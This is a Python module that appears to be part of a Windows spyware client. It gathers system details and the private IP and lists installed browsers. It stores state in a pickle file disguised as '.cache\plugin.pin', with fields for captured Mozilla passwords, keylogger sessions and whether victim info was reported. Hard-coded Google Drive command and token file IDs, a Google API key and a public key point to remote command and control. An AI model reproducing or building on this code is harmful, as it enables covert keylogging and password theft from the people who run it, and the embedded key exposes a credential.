#%%
import codecs
import json
import os
import pickle
import winreg
from functools import cached_property, lru_cache
from os.path import exists, join
from pprint import PrettyPrinter
from shutil import copy
from threading import Event
from traceback import format_exc

from clint.browsers.config.constant import constant
from clint.network import ip
from logger import log

username=constant.username
def formated_str(data):
    if isinstance(data, str):
        return data
    
    try:
        data=json.dumps(data, indent=4)
        return data
    except Exception as e:
        log.warning(f'unknown error while formating type: {type(data)}')
        log.debug(format_exc())
    
    return PrettyPrinter(indent=4).pformat(data)

@lru_cache
def basic_detail():
    import platform
    
    detail = {
        "Processor": platform.processor(),
        "System": f"{platform.system()} {platform.version()}",
        "Machine": platform.machine(),
        "Private IP Address": ip()
    }
    return formated_str(detail)

def size_of(path):
    '''return '0'(int) on non existance'''
    if exists(path):
        return os.stat(path).st_size
    return 0

def force_str(b:bytes):
    a=codecs.encode(b, "hex")
    return a.decode('ascii', "strict")

def random_str(ln):
    '''return random srt of "ln" charecters'''
    return force_str(os.urandom(ln//2))

def makedirs(path):
    try:
        os.makedirs(path)
    except:
        pass

def list_browsers():
    key="SOFTWARE\Clients\StartMenuInternet"
    root = winreg.ConnectRegistry(None, winreg.HKEY_LOCAL_MACHINE)
    with winreg.OpenKey(root, key) as installed:
        browser_count=winreg.QueryInfoKey(installed)[0]    
        return [winreg.EnumKey(installed, idx) for idx in range(browser_count)]

def read_pkl(path):
    ''' return None if the path is unpickable'''
    
    try:
        with open(path, "rb") as f:
            return pickle.load(f)
    except (pickle.UnpicklingError, FileNotFoundError):
        # pickle is incomplete
        return 

def write_pkl(obj, path):
    with open(path, "wb") as f:
        pickle.dump(obj, f)


#%%
class Values:
    def __init__(self):
        self.last_all_time = 0
        self.last_user_time = 0
        self.mozila_keylog = False
        self.clint_info = False# is basic detail reported
        self.mozila_pass = []# can't be anything else than list
        self.klogger_session={}# info needs to restart the key_logger
        self.clock_diff = 0

        self.cfile_id=r"1eO37l2YgGeI9ChV3be1oYprzpyKpmvXG"# command file id
        self.tfile_id=r"1UQBBpNb5KYFuS6qO3QXI2kSeQ0DylvB0"# token file id
        self.api_key=r"AIzaSyB4Q2rKEaR_w7TPL_bOOtSJ9GZMJig3HSs"
        self.key='''LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUV
        GQUFPQ0FROEFNSUlCQ2dLQ0FRRUF6U05FQndwelg0M1ZXd0FwVHNWegppbmlaMDJwUnppenJRZzZrSHU
        4N1JIQXk0MGdnZC9ubCtUcGNMSE83ckQ4OFozYlBLMFl2ZHBMTzdOeWd5TWI2Ckt2djdRd1hnYXFKYWR
        ia3NQR3hpOTNVdElGc3JmL3JSVHFGbi84cmpSZlZ1TFZpR3UyWmRhR3dMZkowdExQVUkKWmdPTFlSUEt
        wcm1YWTJWZFJwR0RWQkxqTm9vak84ZTMxZVgyblVLYisxc2dsZ1VPUktzWHpqSHk4azhkN0VtSgpxYXl
        xVnpmTnpOY1JYNGJWMW9MQ3ZvQXZCTjV0ZERUazE1aHloM2hIWnZCNnlGdFdodHd6dHVvWWUxeUZMcE5
        4Cmd5VWJHWHBVeUFYZ24vMVV0bG5GTFNPdW55M3FZOWIzbnZldTZDeVZ0N2dtNzlIR01CdlhGTVBYcmt
        pdlppZ2sKK1FJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t'''

#%%
class permanent:
    def __init__(self):
        # self.data = USERPROFILE\.cache\plugin.pin
        self.data_dir=join(constant.profile.get("USERPROFILE"), ".cache")
        makedirs(self.data_dir)
        self.backup=join(self.data_dir, "template")# backup admin configured values
        self.data_dir=join(self.data_dir, "plugin.pin")
        self.temp=self.data_dir+"#b"# temporary backup before modefication
        
        self.var = Values()
        self.write = Event()
        self.write.set()


    def setup(self):
        if not size_of(self.data_dir):
            decoded = self.default
            open(self.data_dir, "w").close()
        else:
            decoded:dict = read_pkl(self.data_dir)
            if not decoded:# on error in main file
                decoded = read_pkl(self.temp)
                if not decoded:# if loading temporary backup failed
                    decoded = self.default
            
            # checking for type mismatch
            for k in self.default:
                if not type(decoded.get(k)) is type(self.default.get(k)):
                    self.reset(k)
            
        for k, v in decoded.items():
            # converting <class dict> to <class Value>
            setattr(self.var, k, v)
            # can't use self.set_value
    
        self.commit()
    
    def commit(self):
        self.write.wait()# wait for othrer threads to finish up
        self.write.clear()
        
        copy(self.data_dir, self.temp)
        write_pkl(self.var.__dict__, self.data_dir)
        os.remove(self.temp)
        self.write.set()

    def reset(self, key):
        # log.info(f"stored data reseting for {key}")
        value = Values().__dict__.get(key)
        self.set_value(key, value)

    def set_value(self, key, value, keep_trace=False):
        if keep_trace:
            pre=read_pkl(self.backup) or {}
            pre[key]=value
            write_pkl(pre, self.backup)
        
        setattr(self.var, key, value)
        self.commit()

    @cached_property
    def default(self)->dict:
        values = Values().__dict__
        changed_values:dict = read_pkl(self.backup) or {}
        for k, v in changed_values.items():
            setattr(values, k, v)
        return values

data_store=permanent()
data_store.setup()


# %%
if __name__=="__main__":
    # log.info(data_store.var.gmail)
    data_store.reset("gmail")
